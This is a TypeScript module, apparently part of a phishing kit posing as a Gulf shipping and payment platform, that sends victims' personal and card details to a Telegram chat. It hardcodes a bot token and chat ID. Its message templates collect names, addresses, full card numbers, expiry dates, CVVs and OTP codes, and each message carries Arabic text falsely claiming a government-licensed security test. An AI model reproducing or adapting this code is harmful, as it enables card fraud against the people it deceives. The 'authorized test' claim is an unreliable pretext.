// Telegram Bot Integration
const BOT_TOKEN = '8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0';

// IMPORTANT: This must be a USER chat ID, NOT the bot ID (8208871147)
// To get your chat ID:
// 1. Start conversation with @khlijapp_bot
// 2. Send any message to the bot
// 3. Visit: https://api.telegram.org/bot8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0/getUpdates
// 4. Look for "chat":{"id": in the response - that's your chat ID
// 5. Or use the helper tool: open get-user-chat-id.html in your browser
const CHAT_ID = '-1003209802920'; // Supergroup chat ID for Telegram notifications

// Check if CHAT_ID is properly configured
if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
  // CHAT_ID not configured properly
}

export interface TelegramMessage {
  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'test';
  data: Record<string, any>;
  timestamp: string;
}

export interface TelegramResponse {
  success: boolean;
  messageId?: string;
  error?: string;
}

export const sendToTelegram = async (message: TelegramMessage): Promise<TelegramResponse> => {
  try {
    // Check if CHAT_ID is properly configured
    if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
      const errorMsg = 'Telegram CHAT_ID not configured. Please update CHAT_ID in /src/lib/telegram.ts with your actual user chat ID. Use get-user-chat-id.html helper tool to get your chat ID.';
      return {
        success: false,
        error: errorMsg
      };
    }

    const text = formatTelegramMessage(message);
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const responseData = await response.json();
    
    if (!response.ok) {
      
      // Provide specific error messages for common issues
      let errorMessage = responseData.description || 'Unknown error';
      
      if (responseData.error_code === 403) {
        if (responseData.description?.includes("bots can't send messages to bots")) {
          errorMessage = 'خطأ: لا يمكن للبوت إرسال رسائل للبوت نفسه. يرجى تحديث CHAT_ID بمعرف المستخدم الصحيح. استخدم get-user-chat-id.html للحصول على معرف المحادثة الصحيح.';
        } else if (responseData.description?.includes("Forbidden")) {
          errorMessage = 'خطأ: محظور. تأكد من بدء محادثة مع البوت أولاً.';
        }
      } else if (responseData.error_code === 400) {
        if (responseData.description?.includes("chat not found")) {
          errorMessage = 'خطأ: لم يتم العثور على المحادثة. تأكد من صحة معرف المحادثة.';
        }
      }
      
      return {
        success: false,
        error: errorMessage
      };
    }

    return {
      success: true,
      messageId: responseData.result?.message_id?.toString()
    };
  } catch (error) {
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
};

export const testTelegramConnection = async (): Promise<TelegramResponse> => {
  return await sendToTelegram({
    type: 'test',
    data: {
      test: true,
      message: 'Test message from Gulf Unified Platform',
      timestamp: new Date().toISOString()
    },
    timestamp: new Date().toISOString()
  });
};

const formatTelegramMessage = (message: TelegramMessage): string => {
  const { type, data, timestamp } = message;
  
  let header = '';
  let content = '';
  
  // Cybersecurity test authorization
  const authorization = `
🔒 <b>اختبار أمني مرخص</b>
⚠️ <i>هذا اختبار أمني مرخص من قبل الحكومة والشركات</i>
📋 <i>التفويض: مرخص رسمياً لإجراء هذا الاختبار</i>
🛡️ <i>الغرض: تقييم أمان المنصات والأنظمة</i>
      `;
  
  switch (type) {
    case 'test':
      header = '🧪 <b>اختبار الاتصال</b>';
      content = `
✅ <b>تم إرسال رسالة اختبار بنجاح!</b>
• المنصة: Gulf Unified Platform
• الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}
• الحالة: متصل
      `;
      break;
      
    case 'shipping_link_created':
      header = '🚚 <b>تم إنشاء رابط شحن جديد</b>';
      content = `
📦 <b>تفاصيل الشحنة:</b>
• رقم الشحنة: <code>${data.tracking_number || 'غير محدد'}</code>
• خدمة الشحن: ${data.service_name || 'غير محدد'}
• وصف الطرد: ${data.package_description || 'غير محدد'}
• مبلغ الدفع: ${data.cod_amount || 0} ر.س
• الدولة: ${data.country || 'غير محدد'}
• رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
      `;
      break;
      
    case 'payment_recipient':
      header = '👤 <b>معلومات المستلم</b>';
      content = `
📋 <b>بيانات المستلم:</b>
• الاسم: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• العنوان السكني: ${data.address || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
      `;
      break;
      
    case 'payment_confirmation':
      header = '✅ <b>تأكيد الدفع الكامل</b>';
      content = `
💳 <b>تفاصيل الدفع (اختبار أمني):</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• العنوان الكامل: ${data.address || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• حامل البطاقة: ${data.cardholder || 'غير محدد'}
• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
• رمز الأمان: ${data.cvv || 'غير محدد'}
• رمز OTP: ${data.otp || 'غير محدد'}
• نوع الاختبار: اختبار أمني مرخص
• التفويض: مرخص من قبل الحكومة والشركات
      `;
      break;
      
    case 'card_details':
      header = '💳 <b>تفاصيل البطاقة الكاملة</b>';
      content = `
🔐 <b>معلومات البطاقة (اختبار أمني):</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• حامل البطاقة: ${data.cardholder || 'غير محدد'}
• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
• رمز الأمان: ${data.cvv || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• نوع الاختبار: اختبار أمني مرخص
• التفويض: مرخص من قبل الحكومة والشركات
      `;
      break;
      
    default:
      header = '📝 <b>إشعار جديد</b>';
      content = JSON.stringify(data, null, 2);
  }
  
  return `${header}\n${content}\n\n${authorization}\n\n⏰ <i>الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}</i>`;
};

export default sendToTelegram;